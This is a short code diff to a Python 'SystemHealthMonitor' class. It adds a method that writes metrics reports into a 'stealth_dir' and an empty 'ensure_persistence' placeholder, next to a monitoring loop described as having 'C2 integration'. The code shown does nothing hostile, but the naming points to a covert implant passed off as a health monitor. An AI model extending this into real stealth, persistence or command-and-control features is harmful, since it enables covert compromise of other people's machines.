@@ -116,7 +116,22 @@ class SystemHealthMonitor:
         except Exception as e:
             self.logger.error(f"Error collecting metrics: {e}")
             return None
-    
+
+    def save_metrics_report(self, metrics, config):
+        """Save metrics to a timestamped JSON file"""
+        try:
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            report_path = os.path.join(self.stealth_dir, f"health_report_{timestamp}.json")
+            with open(report_path, 'w') as f:
+                json.dump(metrics, f, indent=2)
+            self.logger.info(f"Metrics report saved: {report_path}")
+        except Exception as e:
+            self.logger.error(f"Failed to save metrics report: {e}")
+
+    def ensure_persistence(self):
+        """Placeholder for persistence logic"""
+        self.logger.info("Persistence check placeholder")
+
     def monitor_loop(self):
         """Main monitoring loop with C2 integration"""
         self.logger.info("Starting system health monitoring with C2")
